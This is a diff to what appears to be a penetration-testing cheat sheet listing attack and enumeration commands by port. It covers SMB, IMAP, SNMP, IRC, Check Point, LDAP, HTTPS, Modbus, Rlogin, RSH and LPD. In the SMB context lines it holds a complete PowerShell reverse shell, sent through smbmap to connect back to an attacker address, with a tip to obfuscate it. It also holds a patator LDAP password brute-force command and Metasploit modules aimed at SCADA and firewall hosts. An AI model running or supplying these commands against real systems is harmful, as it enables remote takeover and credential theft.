@@ -16,6 +16,16 @@ CONTENT
   * [Port 123 - TNP](#port-123---TNP)
   * [Port 135 - MSRPC](#port-135---MSRPC)
   * [Port 139,445 - SMB](#port-139-445---SMB)
+  * [Port 143/993 - IMAP](#port-143-993---IMAP)
+  * [Port 161/162 UDP - SNMP](#port-161-162-UDP---SNMP)
+  * [Port 194/6667/6660/7000 - IRC](#port-194-6667-6660-7000---IRC)
+  * [Port 264 - Check Point FireWall](#port-264---Check-Point-FireWall)
+  * [LDAP - 389/636/3268/3269](#LDAP---389-636-3268-3269)
+  * [HTTPS 443](#HTTPS-443)
+  * [Port 502 - Modbus](#Port-502---Modbus)
+  * [Port 513 - Rlogin](#Port-513---Rlogin)
+  * [Port 514 - RSH](#Port-514---RSH)
+  * [Port 515 - line printerdaemon LPD](#Port-515---line-printerdaemon-LPD)
 
 # RECON
 ```bash
@@ -356,5 +366,95 @@ smbmap.py -H $ip -u username -p 'password' -L
 smbmap.py -u username -p 'password' -d DOMAINNAME -H $ip -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
 
 #you can use obfuscated one!
+```
+## Port 143 993 - IMAP
+```bash
+
+#Banner grabbing
+nc -nv $ip 143
+openssl s_client -connect $ip:<port> -quiet
+
+#NTLM Auth - Information disclosure 
+nmap -sS --script=imap-ntlm-info.nse -sV $ip
+```
+
+## Port 161 162 UDP - SNMP
+```bash
+
+nmap -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
+
+snmp-check $ip -c public|private|community
+
+snmpwalk -v 2c -c public $ip
+```
+
+## Port 194 6667 6660 7000 - IRC
+```bash
+#Enumeration
+nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 <domain>
+```
+
+## Port 264 - Check Point FireWall
+```baash
+msf > use auxiliary/gather/checkpoint_hostname
+```
+##  LDAP - 389 636 3268 3269
+```bash
+# Basic Enumeration
+nmap -n -sV --script "ldap* and not brute" $ip
+
+# Clear text credentials
+* If LDAP is used without SSL you can sniff credentials in plain text in the network.
+
+ldapsearch -h $ip -p 389 -x -b "dc=mywebsite,dc=com"
+
+ldapsearch -x -h $ip -D 'DOMAIN\user' -w 'hash-password'
+
+ldapdomaindump $ip -u 'DOMAIN\user' -p 'hash-password'
+
+ldapsearch -x -h $ip -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
+
+#brut
+
+ldapsearch -x -h $IP -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
+ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
+
+patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
+```
+## HTTPS 443
+```bash 
+sslscan $IP:443
+nmap -sV --script=ssl-heartbleed $IP
+```
+read >>  https://www.kaspersky.com/resource-center/definitions/what-is-a-ssl-certificate
+
+## Port 502 - Modbus
+```bash
+# Enumerate
+nmap --script modbus-discover -p 502 $IP
+msf> use auxiliary/scanner/scada/modbusdetect
+msf> use auxiliary/scanner/scada/modbus_findunitid
+```
+
+## Port 513 - Rlogin
+```bash
+#login
+apt install rsh-client
+rlogin -l <USER> $ip
+```
+
+## Port 514 - RSH
+```bash
+#login
+rsh $ip <Command>
+rsh $ip -l domain\user <Command>
+rsh domain/user@$ip <Command>
+rsh domain\\user@$ip <Command>
+```
+
+## Port 515 - line printerdaemon LPD
+```bash
+# The lpdprint tool included in PRET is a minimalist way to print data directly to an LPD capable printer as shown below:
+lpdprint.py hostname filename
 ```
 
